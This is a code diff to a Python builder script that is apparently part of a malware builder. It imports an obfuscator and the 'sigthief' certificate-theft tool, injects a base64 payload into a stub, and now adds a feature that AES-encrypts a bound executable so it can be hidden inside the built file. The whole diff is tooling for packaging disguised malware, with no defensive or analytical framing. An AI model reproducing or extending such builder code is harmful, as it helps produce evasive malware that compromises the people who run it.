@@ -12,6 +12,7 @@ from urllib3 import PoolManager, disable_warnings
 disable_warnings()
 import BlankOBF as obfuscator
 from sigthief import outputCert
+from pyaes import AESModeOfOperationGCM
 
 SettingsFile = "config.json"
 InCodeFile = "stub.py"
@@ -54,6 +55,20 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
 
     if injection is not None:
         code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
+    
+    if os.path.isfile("bound.exe"):
+        with open("bound.exe", "rb") as file:
+            content = file.read()
+    
+        key = os.urandom(32)
+        iv = os.urandom(32)
+        encrypted = AESModeOfOperationGCM(key, iv).encrypt(content) # File structure: [32 bytes key + 32 bytes iv + encrypted content]
+        with open("bound.aes", "wb") as file:
+            file.write(key)
+            file.write(iv)
+            file.write(encrypted)
+        
+        del content, encrypted
 
     if __name__ == "__main__":
         if settings["settings"]["consoleMode"] == 0:
